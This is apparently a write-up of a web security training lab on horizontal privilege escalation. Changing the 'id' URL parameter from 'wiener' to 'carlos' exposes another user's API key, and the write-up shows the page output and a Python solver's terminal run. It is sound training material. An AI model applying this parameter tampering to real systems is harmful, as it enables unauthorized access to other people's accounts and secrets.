# Lab: User ID controlled by request parameter 

### Instructions

This lab has a horizontal privilege escalation vulnerability on the user account page.

To solve the lab, obtain the API key for the user `carlos` and submit it as the solution.

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

Logging in with the provided credentials we find our account page at: `https://0a57006103c3456b8027df16006e0052.web-security-academy.net/my-account?id=wiener`

This also contains an API key:

```
My Account

Your username is: wiener
Your API Key is: gxOJKxYrkHO5RUPyqb0enieLAnc4SqJU
```
 
With this lab we are able to change the `id` parameter from `wiener` to `carlos`, giving us access to Carlos' account and API key:

```
https://0a57006103c3456b8027df16006e0052.web-security-academy.net/my-account?id=carlos
```

```
My Account

Your username is: carlos
Your API Key is: 2YLGnX6S8yr1jPuaOPRcJnwU3xVkxwj6
```

We can submit this API key as our answer which marks the lab as solved.

### Python Solution

See `access_control_05.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Access_Control/Access_Control_05_user_id_controlled_by_request_parameter]
└─$ python access_control_05.py https://0a57006103c3456b8027df16006e0052.web-security-academy.net
[*] Accessing Carlos' account...
[+] Carlos' API key is: 2YLGnX6S8yr1jPuaOPRcJnwU3xVkxwj6
[*] Submitting answer...
[+] Lab solved
```